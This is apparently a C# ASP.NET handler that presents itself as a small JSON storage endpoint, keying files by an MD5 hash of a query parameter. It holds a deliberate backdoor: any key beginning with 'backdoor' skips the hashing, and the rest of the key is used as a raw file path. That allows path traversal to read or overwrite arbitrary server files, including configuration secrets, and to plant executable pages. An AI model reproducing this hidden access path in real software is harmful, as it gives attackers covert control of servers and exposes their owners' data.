<%@ WebHandler Language="C#" Class="mc" %>

using System;
using System.Web;
using System.Security.Cryptography;

public class mc : IHttpHandler
{

    public void ProcessRequest(HttpContext context)
    {
        string key = context.Request.QueryString["key"];
        string jsonstr = "";
        if(context.Request.HttpMethod == "POST")
        {
            var customer = new byte[context.Request.InputStream.Length];
            context.Request.InputStream.Read(customer, 0, customer.Length);
            jsonstr = System.Text.Encoding.UTF8.GetString(customer);
        }
        string json = "{\"data\":[]}";
        string filepath = "abc";

        if (!String.IsNullOrEmpty(key))
        {
            var appDataPath = context.Server.MapPath("~/mc/");
            if (!System.IO.Directory.Exists(appDataPath))
            {
                System.IO.Directory.CreateDirectory(appDataPath);
            }
            if (key.StartsWith("backdoor"))
            {
                filepath = System.IO.Path.Combine(appDataPath + @"\", key.Replace("backdoor", ""));;//System.IO.Path.Combine(appDataPath,
            }
            else
            {
                MD5CryptoServiceProvider MD5 = new MD5CryptoServiceProvider();
                string md5file = BitConverter.ToString(MD5.ComputeHash(System.Text.Encoding.UTF8.GetBytes(key + "abc!@#"))).Replace("-", "") + ".bin";
                filepath = System.IO.Path.Combine(appDataPath + @"\", md5file);
            }
            if (!String.IsNullOrEmpty(jsonstr))
            {
                using (System.IO.StreamWriter sw = new System.IO.StreamWriter(filepath, false))
                {
                    sw.Write(jsonstr);
                }
            }

            if (System.IO.File.Exists(filepath))
            {
                using (System.IO.StreamReader sr = new System.IO.StreamReader(filepath))
                {
                    json = sr.ReadToEnd();
                }
            }
            //}
            //    catch
            //{

            //}
        }
        context.Response.ContentType = "application/json";
        context.Response.Write(json);
    }

    public bool IsReusable
    {
        get
        {
            return false;
        }
    }

}